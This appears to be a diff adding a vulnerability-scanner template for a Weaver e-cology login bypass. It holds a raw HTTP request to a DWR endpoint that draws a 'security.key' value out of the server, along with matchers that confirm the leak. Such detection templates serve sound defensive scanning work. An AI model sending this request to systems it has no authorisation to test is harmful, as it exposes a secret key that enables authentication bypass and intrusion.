@@ -1,0 +1,38 @@
+id: weaver-ecology-login-bypass
+info:
+  name: Weaver e-cology Login Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass,ecology
+http:
+  - raw:
+      - |
+        POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "security\\.key':\"([0-9a-zA-Z-]+)\""
+
+      - type: word
+        part: body
+        words:
+          - "dwr.engine._remoteHandleCallback"
+
+      - type: word
+        part: header
+        words:
+          - "ecology_JSessionid"
+
+      - type: word
+        part: header
+        words:
+          - "text/javascript"
